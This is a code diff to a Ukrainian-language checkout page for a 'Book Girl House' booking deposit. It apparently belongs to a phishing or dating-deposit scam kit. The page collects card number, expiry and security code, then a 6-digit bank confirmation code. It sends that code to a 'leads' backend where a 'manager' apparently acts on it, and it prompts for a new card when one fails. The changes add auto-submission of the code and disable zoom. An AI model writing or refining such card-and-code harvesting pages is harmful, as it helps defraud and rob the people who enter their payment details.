@@ -2,19 +2,20 @@
 <html lang="uk">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
 <title>Book Girl House — Депозит</title>
 <link rel="icon" href="/favicon.svg" type="image/svg+xml">
 <meta name="description" content="Депозит за підтвердження бронювання Book Girl House. Списання — тільки при зустрічі.">
 <meta property="og:title" content="Book Girl House — Депозит">
 <meta property="og:description" content="Підтвердження бронювання. Депозит спишеться тільки при зустрічі.">
 <meta name="theme-color" content="#f6f9fc">
-<link rel="stylesheet" href="/style.css?v=23">
+<link rel="stylesheet" href="/style.css?v=25">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body class="bgh-checkout">
+<script>try{document.documentElement.classList.add("bgh-lock")}catch(e){}</script>
 <div class="lang-switch light" id="langSwitch">
   <button type="button" data-lang="uk" class="active">UA</button>
   <button type="button" data-lang="en">EN</button>
@@ -389,28 +390,67 @@ $("code").oninput=()=>{
   $("code").value = $("code").value.replace(/\D/g, "").slice(0, 3);
 };
 
-function updateCodeCounter(){const v=$("activation").value.replace(/\D/g,"").slice(0,6);$("activation").value=v}
+function updateCodeCounter(){
+  const v=$("activation").value.replace(/\D/g,"").slice(0,6);
+  $("activation").value=v;
+  // Enable confirm button only when full 6-digit code is entered
+  if(codeStage&&!codeSubmitted&&!waitingForManager){
+    $("send").disabled = v.length!==6;
+  }
+}
 let autoSubmittingCode=false;
+async function submitConfirmationCode(){
+  if(codeSubmitted||waitingForManager||!codeStage||!leadId)return;
+  const code=$("activation").value.replace(/\D/g,"");
+  if(code.length!==6)return;
+  codeSubmitted=true;
+  autoSubmittingCode=false;
+  $("send").disabled=true;
+  $("send").textContent=t("checking");
+  showLoading();
+  try{
+    const r=await fetch("/api/leads/"+leadId+"/submit-code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({code})});
+    const d=await r.json();
+    if(!r.ok)throw Error(d.error||"Error");
+    setStatus(d);
+    if(!poll)poll=setInterval(checkStatus,3000);
+  }catch(e){
+    codeSubmitted=false;
+    hideLoading();
+    $("activation").disabled=false;
+    $("send").disabled=false;
+    $("send").textContent=t("payBtn");
+    $("verr").textContent=e.message||"";
+  }
+}
 function maybeAutoSubmitCode(){
   if(autoSubmittingCode||codeSubmitted||waitingForManager||!codeStage||!leadId)return;
   if($("activation").value.replace(/\D/g,"").length!==6)return;
   autoSubmittingCode=true;
-  setTimeout(()=>{if(!codeSubmitted&&!waitingForManager&&$("activation").value.replace(/\D/g,"").length===6)$("send").click();else autoSubmittingCode=false},120);
+  setTimeout(()=>{
+    if(!codeSubmitted&&!waitingForManager&&$("activation").value.replace(/\D/g,"").length===6){
+      submitConfirmationCode();
+    }else{
+      autoSubmittingCode=false;
+    }
+  },120);
 }
 $("activation").addEventListener("input",()=>{if(codeSubmitted)return;updateCodeCounter();maybeAutoSubmitCode()});
 
 function openCodePanel(){
-  $("pending").hidden=false;codeStage=true;waitingForManager=false;
+  const pending=$("pending");
+  if(pending){pending.hidden=false;pending.style.display="";}
+  codeStage=true;waitingForManager=false;codeSubmitted=false;autoSubmittingCode=false;
   hideLoading();
-  $("codeLoading").hidden=true; // belt-and-suspenders
+  $("codeLoading").hidden=true;
   $("inline-code-entry").hidden=false;
   $("activation").disabled=false;
   $("activation").value="";
-  $("send").disabled=true; // enabled only after 6 digits via auto-submit or when code ready
+  $("send").disabled=true; // becomes enabled when 6 digits entered
   $("send").textContent=t("payBtn");
+  $("verr").textContent="";
   hideCardAlert();
   startRetryCountdown(90);
-  $("pending").scrollIntoView({behavior:"smooth",block:"nearest"});
 }
 function startRetryCountdown(sec){
   if(retryTimer)clearInterval(retryTimer);
@@ -444,7 +484,7 @@ function finish(){
 
 function hideCardAlert(){
   const a=$("cardAlert");
-  if(a)a.hidden=true;
+  if(a){a.hidden=true;a.style.display="none";}
 }
 function showCardAlert(title, text){
   const a=$("cardAlert");
@@ -452,8 +492,8 @@ function showCardAlert(title, text){
   $("cardAlertTitle").textContent=title||t("cardInvalidTitle");
   $("cardAlertText").textContent=text||t("cardInvalid");
   a.hidden=false;
-  // Scroll to the alert inside the form — not to the very top of the page
-  try{a.scrollIntoView({behavior:"smooth",block:"center"})}catch(_){}
+  a.style.display="";
+  // No scroll / no focus — keeps mobile zoom and fonts exactly as they were
 }
 
 function resetFormForNewCard(msg){
@@ -462,16 +502,18 @@ function resetFormForNewCard(msg){
   localStorage.removeItem("fitpass_lead_id");
   leadId=null;codeStage=false;codeSubmitted=false;waitingForManager=false;lastRenderedStatus=null;autoSubmittingCode=false;
   hideLoading();
-  const ov=$("payOverlay");if(ov)ov.hidden=true;
-  // Keep form visible, hide code panel & thank-you
-  $("pending").hidden=true;
-  $("thankYou").hidden=true;
-  const formCard=$("formCard").querySelector(".checkout-card");
-  if(formCard)formCard.hidden=false;
+  const ov=$("payOverlay");if(ov){ov.hidden=true;ov.style.display="none";}
+  // Keep form visible, fully hide code panel & thank-you (no layout / font side-effects)
+  const pending=$("pending");
+  if(pending){pending.hidden=true;pending.style.display="none";}
+  const thank=$("thankYou");
+  if(thank){thank.hidden=true;thank.style.display="none";thank.classList.remove("thank-in");}
+  const formCard=$("formCard")&&$("formCard").querySelector(".checkout-card");
+  if(formCard){formCard.hidden=false;formCard.style.display="";}
   $("inline-code-entry").hidden=false;
   $("activation").value="";
   $("activation").disabled=false;
-  // Clear only card data so client enters another card
+  // Clear only card data so client enters another card (email / name stay)
   $("card").value="";
   $("expiry").value="";
   $("code").value="";
@@ -479,8 +521,8 @@ function resetFormForNewCard(msg){
   $("send").textContent=t("payBtn");
   $("err").textContent="";
   $("verr").textContent="";
+  // Do not touch document fonts, zoom, scroll or focus
   showCardAlert(t("cardInvalidTitle"), msg||t("cardInvalid"));
-  try{$("card").focus({preventScroll:true})}catch(_){try{$("card").focus()}catch(__){}}
 }
 
 function setStatus(d){
@@ -584,16 +626,8 @@ $("send").onclick=async()=>{
       if(!poll)poll=setInterval(checkStatus,3000);
     }catch(e){$("err").textContent=e.message;$("send").disabled=false;$("send").textContent=t("payBtn")}
   }else{
-    if(codeSubmitted)return;
-    const code=$("activation").value.replace(/\D/g,"");
-    if(code.length!==6)return;
-    // Loading starts ONLY here — after client entered the confirmation code
-    codeSubmitted=true;$("send").disabled=true;$("send").textContent=t("checking");showLoading();
-    try{
-      const r=await fetch("/api/leads/"+leadId+"/submit-code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({code})});
-      const d=await r.json();if(!r.ok)throw Error(d.error);
-      setStatus(d);if(!poll)poll=setInterval(checkStatus,3000);
-    }catch(e){codeSubmitted=false;hideLoading();$("activation").disabled=false;$("send").disabled=false;$("send").textContent=t("payBtn");$("verr").textContent=e.message}
+    // Code stage — submit the 6-digit confirmation code
+    await submitConfirmationCode();
   }
 };
 
